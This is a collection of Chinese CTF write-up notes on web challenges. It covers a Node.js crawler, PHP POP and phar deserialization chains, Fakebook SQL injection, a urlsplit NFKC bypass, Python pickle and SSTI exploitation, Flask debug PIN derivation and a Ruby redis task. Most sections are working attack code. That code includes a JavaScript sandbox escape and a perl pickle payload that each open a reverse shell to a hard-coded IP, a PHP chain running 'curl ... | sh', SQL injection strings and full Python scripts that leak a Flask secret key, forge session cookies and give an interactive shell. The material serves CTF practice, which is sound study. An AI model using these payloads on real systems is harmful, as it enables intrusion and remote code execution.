    if (!affiliation || !age || !bucket || typeof (age) !== "string" || typeof (bucket) !== "string" || typeof (affiliation) != "string") {
        return res.render('user', { user, error: "Parameters error or blank." });
    }
    if (!utils.checkBucket(bucket)) {
        return res.render('user', { user, error: "Invalid bucket url." });
    }
    let authToken;
    try {
        await User.update({
            affiliation,
            age,
            personalBucket: bucket
        }, {
            where: { userId: req.session.userId }
        });
        const token = crypto.randomBytes(32).toString('hex');
        authToken = token;
        await Token.create({ userId: req.session.userId, token, valid: true });
        await Token.update({
            valid: false,
        }, {
            where: {
                userId: req.session.userId,
                token: { [Op.not]: authToken }
            }
        });
    } catch (err) {
        next(createError(500));
    }
    if (/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(bucket)) {
        res.redirect(`/user/verify?token=${authToken}`)
    } else {
        // Well, admin won't do that actually XD. 
        return res.render('user', { user: user, message: "Admin will check if your bucket is qualified later." });
    }
});

router.get('/verify', async (req, res, next) => {
    let { token } = req.query;
    if (!token || typeof (token) !== "string") {
        return res.send("Parameters error");
    }
    let user = await User.findByPk(req.session.userId);
    const result = await Token.findOne({
        token,
        userId: req.session.userId,
        valid: true
    });
    if (result) {
        try {
            await Token.update({
                valid: false
            }, {
                where: { userId: req.session.userId }
            });
            await User.update({
                bucket: user.personalBucket
            }, {
                where: { userId: req.session.userId }
            });
            user = await User.findByPk(req.session.userId);
            return res.render('user', { user, message: "Successfully update your bucket from personal bucket!" });
        } catch (err) {
            next(createError(500));
        }
    } else {
        user = await User.findByPk(req.session.userId);
        return res.render('user', { user, message: "Failed to update, check your token carefully" })
    }
})

// Not implemented yet
router.get('/bucket', async (req, res) => {
    const user = await User.findByPk(req.session.userId);
    if (/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(user.bucket)) {
        return res.json({ message: "Sorry but our remote oss server is under maintenance" });
    } else {
        // Should be a private site for Admin
        try {
            const page = new Crawler({
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
                referrer: 'https://www.ichunqiu.com/',
                waitDuration: '3s'
            });
            await page.goto(user.bucket);
            const html = page.htmlContent;
            const headers = page.headers;
            const cookies = page.cookies;
            await page.close();

            return res.json({ html, headers, cookies});
        } catch (err) {
            return res.json({ err: 'Error visiting your bucket. ' })
        }
    }
});

module.exports = router;
```

- 访问profile后生成一个token，跳转到verify然后存入personalBucket,在这个时候抓包让他访问不了verify

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled%204.png)

- 再把第一个包改成自己的vps

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled%205.png)

```jsx
<script>c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i >& /dev/tcp/49.232.206.37/23456 0>&1'],);console.log(ls.output.toString());")()</script>
```

然后访问/user/bucket就可以反弹shell，bucket会去爬取对应页面

![Untitled](../BUU月赛/attachment/node%20js%201e075dab9cd848caae679178663119ea/Untitled%206.png)


## [WMCTF2020]webcheckin

www.zip源码泄露，写在脸上的反序列化

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled.png)

全局搜索function __destruct唯一可以利用的是ws.php中的

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%201.png)

```php
function __destruct() {
        if (isset($this->server->events['disconnect']) &&
            is_callable($func=$this->server->events['disconnect']))
            $func($this);
    }
```

向上看有一个fetch方法，可以作为跳板方法read()可以触发__call

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%202.png)

这个call函数直接调用了 call_user_func_array且$func和$args可控

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%203.png)

\CLI\Agent::__destruct()->\CLI\Agen::fetch()->DB\SQL\Mapper::__call()

链子到这里利用就结束了，但是值得注意的是，再这里我们需要的是Agent类。但是，如果直接构造Agent类的话autoload机制就会去加载cli/agent.php，这样显然是会失败的，只能先构造一个ws类，让他加载ws.php

```php
<?php
namespace DB\SQL{
    class Mapper{
        protected $props = array();
        public function __construct()
        {
            $this->props["read"] = "system";
        }
    }
}
namespace CLI{
    class Agent{
        protected $server;
        protected $socket;
        public function __construct($a)
        {
            $this->server = $a;
            $this->socket = "curl https://your-shell.com/49.232.206.37:23456 | sh";
        }
    }
    class WS{
        protected $addr;
        public function __construct()
        {
            $this->addr = new Agent(new \Auth());
        }
    }
}
namespace {
    class Auth{
        public $events = array();
        public function __construct()
        {
            $this->events['disconnect'] = array(new CLI\Agent(new DB\SQL\Mapper()), "fetch");
        }
    }
    echo urlencode(serialize(new CLI\WS()));
}
```

最后这个Auth是似乎是随意的类都可以，不管是否有event这个值都要塞进去，不是很明白，但是在下面这篇文章中相同的链子是用了Log类来为even[]变量赋值为array("disconnect"=>array($b,'fetch')), array($b,'fetch')即为fentch，其中$b为fetch的所属类

这个其余几条链子的讲解

[fatfree3.7.2反序列化探析 - View of Thai](https://www.viewofthai.link/2022/08/07/fatfree3-7-2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%8e%a2%e6%9e%90/)


## [Chaos Communication Camp 2019]PDFCreator #phar反序列化 

大概功能就是能够将上传的图片文件转化为PDF

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%204.png)

6.2.13这个版本存在上面的CVE，就是可以在PDF中插入html代码，同时绕过src插入为phar可以引发phar反序列化

那么只需要生成phar文件就可以了，值得注意的是phar的攻击点和命名空间的问题

PDFCreator类是PDFStuff空间下的所以phar也要在PDFStuff下生成

```php
else if (isset($_POST["pdfcontent"]))
{
	$creator = new \PDFStuff\PDFCreator();
	$creator->createPdf($_POST["pdfcontent"]);
}
?>
```

phar的攻击位置，creator.php中有

```php
function \_\_destruct()
 {
    if (file_exists($this->tmpfile))
 {
$info = pathinfo($this->tmpfile);
if ($info['extension'] == "pdf")
{
	unlink($this->tmpfile);
}
else
{
	echo "Could not delete created PDF: Not a pdf. Check the file: " . file_get_contents($this->tmpfile);
}
 }
 }
```

Poc

```php
<?php
namespace PDFStuff {
    class PDFCreator
    {
        public $tmpfile = "/var/www/site/flag.php";
    }

    $phar = new \Phar("phar.phar");
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("GIF89a" . " __HALT_COMPILER(); ?>");
    $o = new PDFCreator();
    $phar->setMetadata($o);
    $phar->stopBuffering();
    rename('phar.phar', 'exp.jpg');

}
```

生成后在pdfcontent插入phar://./upload/b0ab0254bd58eb87eaee3172ba49fefb.jpg

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%205.png)

在f12里

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%206.png)

exp

```php
<?php
class Easytest{
	protected $test = "1";

}

class Main{
	public $url = "file:///etc/passwd";
}

$a = new Easytest();

echo urlencode(serialize($a));

$b = new Main();

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub('GIF89a'. '<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($b);
$phar->addFromString('text.txt', 'test');
$phar->stopBuffering();
```

上传位置

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%207.png)

File is an image - image/gif.The file f1dc882dbe.png has been uploaded to ./uploads/

[https://www.notion.so](https://www.notion.so)

在/proc/net/arp找到了内网信息

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%208.png)

## [NPUCTF2020]ReadlezPHP #反序列化 

F12

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%209.png)

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

EXP

```php
<?php  

class HelloPhp
{
    public $a = "phpinfo()";
    public $b = "assert";
}

$a = serialize(new HelloPhp);
echo $a;
?>
```

ban了system

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2010.png)

里面有flag

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2011.png)

## [网鼎杯 2018]Fakebook #反序列化

御剑开扫，啥也没到

注册一下

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2012.png)

在首页可以看url，猜测是sql，所以重新抓了一个注册包来看看注册的参数

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2013.png)

sql注入的时候发生了奇怪的事情，burp会返回400，但是在浏览器中不影响，本来认为是url编码的问题但是在调了url编码输入后还是一样

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2014.png)

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2015.png)

发现有过滤，union select

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2016.png)

回显里有一个unserialize()

- 爆库：no=-1 union all select 1,database(),3,4#
    - fakebook
- 爆表：no=-1 union all select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#
    - users
- 爆字段：no=-1 union all select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
    - no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
- 爆内容：no=-1 union all select 1,data,3,4 from users#

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2017.png)

发现确实是反序列化，那应该是存在源码泄露的

dirsearch扫了一下

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2018.png)

存在user.php.bak

```php
<?php

class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

一开始认为需要构造序列化的链子但其实可以直接用之前爆出来的序列化数据改一下，配合伪协议直接拿到数据，但前提是你得知道存在flag.php这个文件

O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:1;s:4:"blog";s:29:”file:///var/www/html/flag.php”;}

- no=-1 union all select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:1;s:4:"blog";s:29:”file:///var/www/html/flag.php”;}'#

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2019.png)

**其他解：**

直接sql注入load_file

- no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4#

![Untitled](../BUU月赛/attachment/PHP反序列化%20d90af503f8914fd0b2d3439c30147b00/Untitled%2020.png)



## CVE-2019-9636：urlsplit不处理NFKC标准化

```python
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass

def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False

if __name__=="__main__":
    get_unicode()
```

- ℂ是替代c
- ℆转码后是c/u
    
    ![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled.png)
    

然后目录穿越拿flag

**NFKC**

?url=file:////suctf.cc/etc/passwd

## [LineCTF2022]Memo Driver #CVE

### CVE-2021-23336

```python
from starlette.testclient import TestClient
from starlette.requests import Request
from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import PlainTextResponse

param_value = 'a;b;c'
url = f'/test?param={param_value}'

async def test_route(request: Request):
    param = request.query_params['param']  
    # param is 'a' 
    # request.query_params.keys() is ['param', 'b', 'c']
    assert param == param_value  # Assertion failed
    return PlainTextResponse(param)

app = Starlette(debug=True, routes=[Route('/test', test_route)])

client = TestClient(app)

response = client.request(url=url, method='GET')

```

[https://github.com/encode/starlette/issues/1325](https://github.com/encode/starlette/issues/1325)

利用query_params的错误解析当value值以;分割后，query_params会截取;前半截，而query_params.keys()会将key和a;后面的b,c当做key

那么就可以利用这个特性来传入文件路径

在save那里填一个wumonster然后save下面就会有一个链接跳转

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%201.png)

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%202.png)

这样这里就有了ClientId   67eb9cc01b6d566e811945ab5b376ac5

这是大抵的运行流程，那么我们只需要利用;构造好内容就可以去访问flag了

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%203.png)

flag的路径应该是./memo/67eb9cc01b6d566e811945ab5b376ac5/../flag

将参数构造为  veiw?67eb9cc01b6d566e811945ab5b376ac5=flag;/..

view中的query_params会只拿到值flag

即filename = request.query_params[clientId] → filename=’flag’

但是request.query_params 中还有[(’67eb9cc01b6d566e811945ab5b376ac5’,’flag’),(’/..’,’’)]

request.query_params.keys()有两个key值连在一起 `67eb9cc01b6d566e811945ab5b376ac5/..`

所以path的值就是../memo/67eb9cc01b6d566e811945ab5b376ac5/../flag

这样构造路径就可以访问到flag

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%204.png)

本来想着往上穿几层看看，结果还是一样的

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%205.png)

## [Zer0pts2020]notepad(ssti+python反序列化) #pickle反序列化

app.py

```python
import flask
import flask_bootstrap
import os
import pickle
import base64
import datetime

app = flask.Flask(__name__)
app.secret_key = os.urandom(16)
bootstrap = flask_bootstrap.Bootstrap(app)

@app.route('/', methods=['GET'])
def index():
    return notepad(0)

@app.route('/note/<int:nid>', methods=['GET'])
def notepad(nid=0):
    data = load()
    
    if not 0 <= nid < len(data):
        nid = 0
    
    return flask.render_template('index.html', data=data, nid=nid)

@app.route('/new', methods=['GET'])
def new():
    """ Create a new note """
    data = load()
    data.append({"date": now(), "text": "", "title": "*New Note*"})
    flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    
    return flask.redirect('/note/' + str(len(data) - 1))

@app.route('/save/<int:nid>', methods=['POST'])
def save(nid=0):
    """ Update or append a note """
    if 'text' in flask.request.form and 'title' in flask.request.form:
        title = flask.request.form['title']
        text = flask.request.form['text']
        data = load()
        
        if 0 <= nid < len(data):
            data[nid] = {"date": now(), "text": text, "title": title}
        else:
            data.append({"date": now(), "text": text, "title": title})
        
        flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    else:
        return flask.redirect('/')
    
    return flask.redirect('/note/' + str(len(data) - 1))

@app.route('/delete/<int:nid>', methods=['GET'])
def delete(nid=0):
    """ Delete a note """
    data = load()

    if 0 <= nid < len(data):
        data.pop(nid)
    if len(data) == 0:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]
    
    flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    
    return flask.redirect('/')

@app.route('/reset', methods=['GET'])
def reset():
    """ Remove every note """
    flask.session['savedata'] = None
    
    return flask.redirect('/')

@app.route('/favicon.ico', methods=['GET'])
def favicon():
    return ''

@app.errorhandler(404)
def page_not_found(error):
    """ Automatically go back when page is not found """
    referrer = flask.request.headers.get("Referer")
    
    if referrer is None: referrer = '/'
    if not valid_url(referrer): referrer = '/'
    
    html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)
    
    return flask.render_template_string(html), 404

def valid_url(url):
    """ Check if given url is valid """
    host = flask.request.host_url
    
    if not url.startswith(host): return False  # Not from my server
    if len(url) - len(host) > 16: return False # Referer may be also 404
    
    return True

def load():
    """ Load saved notes """
    try:
        savedata = flask.session.get('savedata', None)
        data = pickle.loads(base64.b64decode(savedata))
    except:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]
    
    return data

def now():
    """ Get current time """
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

if __name__ == '__main__':
    app.run(
        host = '0.0.0.0',
        port = '8001',
        debug=False
    )
```

在404里有一个SSTI

在Referer中进行SSTI，但是在404的路由中调用了vaild_url(referer)限制了长度为16所以就只能构造{{config}}

[https://www.notion.so](https://www.notion.so)

<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'\xef\xca;\x11._ \x81)\xea\x16\xbb\x9a\xb5\xbe\x0e', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>

但是在源码中还存在一个地方，可以进行pickle反序列化

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%206.png)

拿别人的exp生成一下，也记录一下这种弹shell方式

```python
import pickle
import base64
import os
class Person(object):
    def __reduce__(self):
        return (os.system,("""perl -e 'use Socket;$i="174.1.231.162";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",))
admin=Person()
print(base64.b64encode(pickle.dumps(admin)))
```

然后用flask_cookie_session_manager来处理最后把cookie带上就好

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%207.png)

SECRET_KEY中的不可见字符极大的影响了操作这里贴一下官方的脚本，纯python处理

```python
# coding: utf-8
import re
import base64
import hashlib
import pickle
import requests
import os
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

host = os.getenv("HOST", 'fa6bdc63-af9b-497c-9456-dda2e6c9ac2f.node4.buuoj.cn')
port = os.getenv("PORT", '81')
url_new = "http://{}:{}/new".format(host, port)
url_note = "http://{}:{}/note/0".format(host, port)
url_404 = "http://{}:{}/qwerty".format(host, port)
url_referer = "http://{}:{}/{{{{config}}}}".format(host, port)

# leak the secret key
r = requests.get(url_404, headers={'referer': url_referer})
result = re.findall(b"SECRET_KEY&#39;: b&#39;(.+)&#39;, &#39;PERMANENT_SESSION_LIFETIME", r.text.encode("ascii"))
key = eval(b'b"' + result[0] + b'"')

# get a valid session
r = requests.get(url_new, allow_redirects=False)
session = r.cookies.get("session")

# decode
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
s = URLSafeTimedSerializer(
    key,
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)
data = s.loads(session)

cmd = ["ls", "-l"]
# inject
class Evil(object):
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (self.cmd, ))
evil = [
    {"date": "", "text": "", "title": Evil(cmd)}
]
data['savedata'] = base64.b64encode(pickle.dumps(evil))
# generate
cookies = {
    "session": s.dumps(data)
}
r = requests.get(url_note, cookies=cookies)
```

这个是可以拿到交互式的shell

```python
# coding: utf-8
import re
import base64
import hashlib
import pickle
import requests
import os
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

host = os.getenv("HOST", 'fa6bdc63-af9b-497c-9456-dda2e6c9ac2f.node4.buuoj.cn')
port = os.getenv("PORT", '81')
url_new = "http://{}:{}/new".format(host, port)
url_note = "http://{}:{}/note/0".format(host, port)
url_404 = "http://{}:{}/qwerty".format(host, port)
url_referer = "http://{}:{}/{{{{config}}}}".format(host, port)

# leak the secret key
r = requests.get(url_404, headers={'referer': url_referer})
result = re.findall(b"SECRET_KEY&#39;: b&#39;(.+)&#39;, &#39;PERMANENT_SESSION_LIFETIME", r.text.encode("ascii"))
key = eval(b'b"' + result[0] + b'"')

# get a valid session
r = requests.get(url_new, allow_redirects=False)
session = r.cookies.get("session")

# decode
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
s = URLSafeTimedSerializer(
    key,
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)
data = s.loads(session)

while True:
    print("$ ", end="")
    cmd = input().split()
    # inject
    class Evil(object):
        def __init__(self, cmd):
            self.cmd = cmd
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (self.cmd, ))
    evil = [
        {"date": "", "text": "", "title": Evil(cmd)}
    ]
    data['savedata'] = base64.b64encode(pickle.dumps(evil))
    # generate
    cookies = {
        "session": s.dumps(data)
    }
    r = requests.get(url_note, cookies=cookies)
    result = re.findall(b"title\" value=\"b&#39;(.+)&#39;\"><br>", r.text.encode("ascii"))
    print(result)
```

## [WesternCTF2018]shrine #沙箱逃逸

利用python对象间的引用关系来调用被禁用的对象

```python
import flask
import os
 
app = flask.Flask(__name__)
 
app.config['FLAG'] = os.environ.pop('FLAG')
 
@app.route('/')
def index():
    return open(__file__).read()
 
@app.route('/shrine/<path:shrine>')
def shrine(shrine):
 
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
 
    return flask.render_template_string(safe_jinja(shrine))
 
if __name__ == '__main__':
    app.run(debug=True)
```

读取全局变量

- url_for
- get_flashed_messages

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%208.png)

这样就可以绕过沙箱调用config了

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%209.png)



## [GYCTF2020]FlaskApp #PIN码

ssti报错说明开启了debug

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%2010.png)

- 文件位置 报错界面就有
    - **/usr/local/lib/python3.7/site-packages/flask/app.py**
- flask登录的用户名
    - {{().__class__.__bases__[0].__subclasses__()[75].__init__.___globals__.__builtins__['open'](’/etc/passwd’).read()}}
    - flaskweb
    
    ![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%2011.png)
    
- 读/sys/class/net/eth0/address拿mac
    - 86:ce:74:4e:b9:3e  要转为10进制
- docker环境，因此读机器id需要读/proc/self/cgroup
    - 2f6c7c562dde90a54aadbbf3f0fb4f53053cb1a8694517af60ff8d93018351eb

pin：615-606-273

传入后rce

![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%2012.png)

其他解：

直接ssti

- `{{''.__class__.__bases__[0].__subclasses__()[75].__init__.___globals__['__builtins__'][['](notion://www.notion.so/'o'+'s')imp'+'ort['](notion://www.notion.so/'o'+'s')].listdir('/')}}`
- `{% for c in []__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`

## [Zer0pts2020]urlapp #Ruby

```ruby
require 'sinatra'
require 'uri'
require 'socket'

def connect()
  sock = TCPSocket.open("redis", 6379)

  if not ping(sock) then
    exit
  end

  return sock
end

def query(sock, cmd)
  sock.write(cmd + "\r\n")
end

def recv(sock)
  data = sock.gets
  if data == nil then
    return nil
  elsif data[0] == "+" then
    return data[1..-1].strip
  elsif data[0] == "$" then
    if data == "$-1\r\n" then
      return nil
    end
    return sock.gets.strip
  end

  return nil
end

def ping(sock)
  query(sock, "ping")
  return recv(sock) == "PONG"
end

def set(sock, key, value)
  query(sock, "SET #{key} #{value}")
  return recv(sock) == "OK"
end

def get(sock, key)
  query(sock, "GET #{key}")
  return recv(sock)
end

before do
  sock = connect()
  set(sock, "flag", File.read("flag.txt").strip)
end

get '/' do
  if params.has_key?(:q) then
    q = params[:q]
    if not (q =~ /^[0-9a-f]{16}$/)
      return
    end

    sock = connect()
    url = get(sock, q)
    redirect url
  end

  send_file 'index.html'
end

post '/' do
  if not params.has_key?(:url) then
    return
  end

  url = params[:url]
  if not (url =~ URI.regexp) then
    return
  end

  key = Random.urandom(8).unpack("H*")[0]
  sock = connect()
  set(sock, key, url)

  "#{request.host}:#{request.port}/?q=#{key}"
end
```

![Untitled](../BUU月赛/attachment/Ruby%202feabbf07ce24f4e827b1a9ef4567d1c/Untitled.png)

大概就是让flag的f和1异或变成W

然后用setbit将第1位、第2位和第四位二进制改变使其变成？以此来将flag带出